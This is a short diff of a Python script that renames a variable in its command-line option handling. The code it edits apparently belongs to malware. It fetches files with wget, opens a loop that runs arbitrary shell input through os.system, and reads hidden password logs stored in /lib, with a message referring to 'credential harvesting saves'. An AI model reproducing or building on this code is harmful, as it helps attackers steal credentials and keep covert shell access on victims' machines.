@@ -80,7 +80,7 @@ def main():
                 else:
                     os.system("mkdir "+Dir)
                     os.system("wget -P "+Dir+ " "+link)
-        elif(value.lower() in ('-c', '--command')):
+        elif(option.lower() in ('-c', '--command')):
             print("Entering Command-Line.....(Enter \"exit\" to exit)")
             x = True
             while(x):
@@ -93,7 +93,7 @@ def main():
                     print(os.uname())
                 else:
                     os.system(inVal)
-        elif(value.lower() in ('-p', '--pass')):
+        elif(option.lower() in ('-p', '--pass')):
             a = True
             if(file.path.exists("/lib/.passwdLog")):
                 a = False
@@ -105,7 +105,7 @@ def main():
                 os.system("cat /lib/.syslogbLog | less")
             if(a):
                 print("No credential harvesting saves present.")
-        elif(value.lower() in ('-i', '--install')):
+        elif(option.lower() in ('-i', '--install')):
             print("Installing modules...")
             print("")
             print("Current status:")
